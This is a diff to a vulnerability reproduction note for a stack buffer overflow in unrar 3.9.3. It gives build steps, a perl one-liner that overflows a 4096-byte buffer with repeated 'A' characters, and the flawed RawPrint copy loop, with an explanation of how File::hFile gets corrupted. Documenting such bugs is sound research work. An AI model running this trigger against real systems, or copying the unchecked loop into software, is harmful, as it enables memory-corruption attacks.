@@ -11,7 +11,6 @@ wget https://github.com/mudongliang/source-packages/raw/master/EDB-17611/unrarsr
 
 tar -xvf unrarsrc-3.9.3.tar.gz
 cd unrar
-
 make -f makefile.unix
 
 ```
@@ -20,7 +19,9 @@ make -f makefile.unix
 
 ## How to trigger vulnerability
 
-unrar/unrar -`perl -e 'print "3lrvs"x830'`
+`unrar/unrar -$(perl -e 'print "A"x4084')`
+
+stack buffer to be overflowed is 4096 bytes long, 4084 bytes of charater A and 24 bytes of added error message is just enough for triggering vulnerability. mainly to change File::hFile's value;
 
 ## PoCs
 
@@ -30,10 +31,18 @@ unrar/unrar -`perl -e 'print "3lrvs"x830'`
 
 ### Root Cause
 
-```
 consio.cpp:87
+```
+RawPrint() {
+	File OutFile;
+	char OutMsg[4096], *OutPos = OutMsg;
+	for (int I = 0; Msg[I]!=0 ; I++) {
+		if (Msg[I]!='\r')
+			*(OutPos++)=Msg[I]; // only check if Mgs[I]==0 or Msg[I]=='\r', easy to overflow
+	}
 
-      *(OutPos++)=Msg[I];
+	OutFile.Write(Msg, strlen(Msg)); // OutFile's member - OutFile::hFile has already been changed due to overflow
+}
 ```
 
 ### Stack Trace
